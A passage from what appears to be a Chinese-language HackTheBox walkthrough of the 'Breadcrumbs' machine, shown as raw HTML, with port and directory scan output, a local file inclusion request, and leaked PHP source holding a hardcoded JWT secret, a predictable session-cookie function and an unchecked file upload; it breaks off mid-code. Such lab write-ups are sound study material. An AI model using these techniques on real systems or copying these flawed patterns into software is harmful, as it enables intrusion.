class="line">2b36cf6bd3cd95fc37d6e2f81e80163b</span><br></pre></td></tr></table></figure><p>这提权部分实在是过于牵强了…</p><hr /><h1 id="hackthebox_breadcrumbs"><a class="markdownIt-Anchor" href="#hackthebox_breadcrumbs"></a> HackTheBox_Breadcrumbs</h1><h2 id="端口扫描-5"><a class="markdownIt-Anchor" href="#端口扫描-5"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.228</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.228</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORTSTATE    SERVICE   VERSION</span><br><span class="line">22/tcp   openssh  OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">80/tcp   openhttp Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">135/tcp  openmsrpcMicrosoft Windows RPC</span><br><span class="line">139/tcp  opennetbios-ssn    Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  openssl/http  Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">445/tcp  openmicrosoft-ds?</span><br><span class="line">1107/tcp filtered isoipsigport-2</span><br><span class="line">3306/tcp openmysql?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=6/11%Time=60C2E951%P=x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.3&#x27;\x20is\x20not\x20allowe</span></span><br><span class="line"><span class="string">SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(GenericLines,</span><br><span class="line">SF:49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.3&#x27;\x20is\x20not\x20allowed\x</span></span><br><span class="line"><span class="string">SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>);</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="路径扫描"><a class="markdownIt-Anchor" href="#路径扫描"></a> 路径扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.228/</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.10.228/ ----</span><br><span class="line">+ http://10.10.10.228/aux (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/books/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/Books/</span><br><span class="line">+ http://10.10.10.228/cgi-bin/ (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com3 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/con (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/css/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/db/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/DB/</span><br><span class="line">+ http://10.10.10.228/examples (CODE:503|SIZE:401)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/includes/</span><br><span class="line">+ http://10.10.10.228/index.php (CODE:200|SIZE:2368)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/js/</span><br><span class="line">+ http://10.10.10.228/licenses (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/lpt1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/lpt2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/nul (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/php/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/PHP/</span><br><span class="line">+ http://10.10.10.228/phpmyadmin (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/</span><br><span class="line">+ http://10.10.10.228/prn (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/server-info (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/server-status (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/webalizer (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.10.10.228/portal/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/assets/</span><br><span class="line">+ http://10.10.10.228/portal/aux (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com3 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/con (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/db/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/DB/</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/includes/</span><br><span class="line">+ http://10.10.10.228/portal/index.php (CODE:302|SIZE:0)</span><br><span class="line">+ http://10.10.10.228/portal/lpt1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/lpt2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/nul (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/php/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/PHP/</span><br><span class="line"></span><br><span class="line">+ http://10.10.10.228/portal/prn (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/uploads/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/vendor/</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jun 12 13:42:20 2021</span><br><span class="line">DOWNLOADED: 9224 - FOUND: 27</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-5"><a class="markdownIt-Anchor" href="#漏洞利用-5"></a> 漏洞利用</h2><p>访问路径<code>/php/books.php</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/includes/bookController.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">title=a&amp;author=&amp;method=0</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/includes/bookController.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">book=book7.html&amp;method=1</span><br></pre></td></tr></table></figure><p>可以看到对<code>/includes/bookController.php</code>发起的两种POST请求<br />第二种请求存在LFI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning:  file_get_contents(..&#x2F;books&#x2F;): Failed to open stream: No such file or directory in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php on line 28</span><br><span class="line">false</span><br></pre></td></tr></table></figure><p>且Apache配置上存在目录遍历漏洞, 可以配合LFI进行文件读取</p><ul><li><code>/portal/authController.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;cookie.php&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$errors</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$userdata</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//if user clicks on login</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;SELECT username,position FROM users WHERE username=? LIMIT 1&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$query</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_array(MYSQLI_ASSOC))&#123;</span><br><span class="line">            array_push(<span class="variable">$userdata</span>, <span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$userCount</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$userCount</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$password</span> = sha1(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$passwordQuery</span> = <span class="string">&quot;SELECT * FROM users WHERE password=? AND username=? LIMIT 1&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$passwordQuery</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$password</span>, <span class="variable">$username</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$valid</span>)&#123;</span><br><span class="line">            session_id(makesession(<span class="variable">$username</span>));</span><br><span class="line">            session_start();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$secret_key</span> = <span class="string">&#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;</span>;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$payload</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span></span><br><span class="line">            ));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$jwt</span> = JWT::encode(<span class="variable">$payload</span>, <span class="variable">$secret_key</span>, <span class="string">&#x27;HS256&#x27;</span>);</span><br><span class="line">            </span><br><span class="line">            setcookie(<span class="string">&quot;token&quot;</span>, <span class="variable">$jwt</span>, time() + (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$userdata</span>[<span class="number">0</span>][<span class="string">&#x27;position&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;Awaiting approval&quot;</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$userdata</span>[<span class="number">0</span>][<span class="string">&#x27;position&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            header(<span class="string">&quot;Location: /portal&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;valid&#x27;</span>] = <span class="string">&quot;Username or Password incorrect&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$passwordConf</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwordConf&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username Required&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username must be at least 4 characters long&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&quot;Password Required&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> !== <span class="variable">$passwordConf</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;passwordConf&#x27;</span>] = <span class="string">&quot;Passwords don&#x27;t match!&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$userQuery</span> = <span class="string">&quot;SELECT * FROM users WHERE username=? LIMIT 1&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$userQuery</span>);</span><br><span class="line">        <span class="variable">$stmt</span> -&gt;bind_param(<span class="string">&#x27;s&#x27;</span>,<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">        <span class="variable">$userCount</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$userCount</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username already exists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$errors</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$password</span> = sha1(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users(username, password, age, position) VALUES (?,?, 0, &#x27;&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="variable">$stmt</span> -&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;execute())&#123;</span><br><span class="line">                <span class="variable">$user_id</span> = <span class="variable">$con</span>-&gt;insert_id;</span><br><span class="line">                header(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">                <span class="variable">$errors</span>[<span class="string">&#x27;db_error&#x27;</span>]=<span class="string">&quot;Database error: failed to register&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>/portal/cookie.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $username  Username requesting session cookie</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string $session_cookie Returns the generated cookie</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@devteam</span></span></span><br><span class="line"><span class="comment"> * Please DO NOT use default PHPSESSID; our security team says they are predictable.</span></span><br><span class="line"><span class="comment"> * CHANGE SECOND PART OF MD5 KEY EVERY WEEK</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makesession</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$max</span> = strlen(<span class="variable">$username</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$seed</span> = rand(<span class="number">0</span>, <span class="variable">$max</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;s4lTy_stR1nG_&quot;</span>.<span class="variable">$username</span>[<span class="variable">$seed</span>].<span class="string">&quot;(!528.\/9890&quot;</span>;</span><br><span class="line">    <span class="variable">$session_cookie</span> = <span class="variable">$username</span>.md5(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$session_cookie</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>/portal/includes/fileController.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;../vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jwt</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret_key</span> = <span class="string">&#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;</span>;</span><br><span class="line">    <span class="variable">$ret</span> = JWT::decode(<span class="variable">$jwt</span>, <span class="variable">$secret_key</span>, <span class="keyword">array</span>(<span class="string">&#x27;HS256&#x27;</span>));   </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$admins</span> = <span class="keyword">array</span>(<span class="string">&quot;paul&quot;</span>);</span><br><span class="line">    <span class="variable">$user</span> = validate()-&gt;data-&gt;username;</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$user</span>, <span class="variable">$admins</span>) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;paul&quot;</span>)&#123;</span><br><span class="line">        error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">        <span class="variable">$uploads_dir</span> = <span class="string">&#x27;../uploads&#x27;</span>;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="string">&quot;<span class="subst">$uploads_dir</span>/<span class="subst">$name</span>&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="string">&quot;Success. Have a great weekend!&quot;</span>;</span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="string">&quot;Missing file or title :(&quot;</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&quot;Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>/portal/php/files.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span 